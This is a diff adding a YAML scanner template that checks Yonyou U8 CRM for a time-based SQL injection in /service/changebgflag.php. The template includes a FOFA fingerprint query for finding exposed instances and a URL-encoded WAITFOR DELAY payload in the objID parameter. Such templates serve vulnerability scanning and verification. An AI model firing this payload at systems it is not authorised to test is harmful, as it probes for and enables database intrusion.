@@ -1,0 +1,20 @@
+id: poc-yaml-yongyon-u8-crm-changebgflag-php-sqli
+info:
+  name: 用友U8 CRM changebgflag.php SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友U8+CRM
+  fofa: body="用友U8CRM"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /login/login.php
+  expression: status_code == 200 && contains(body,"用友U8CRM")
+- method: GET
+  path: /service/changebgflag.php?UserSessionID=bgsesstimeout-&objType=1&StopBgFlag=1&objID=1%27%3BWAITFOR+DELAY+%270%3A0%3A{{.t1}}%27--
+  expression: status_code == 200 && contains(headers,"PHPSESSID=bgsesstimeout-") &&
+    !contains(body,"<html") && duration > t1 && duration < t2
+transport: http
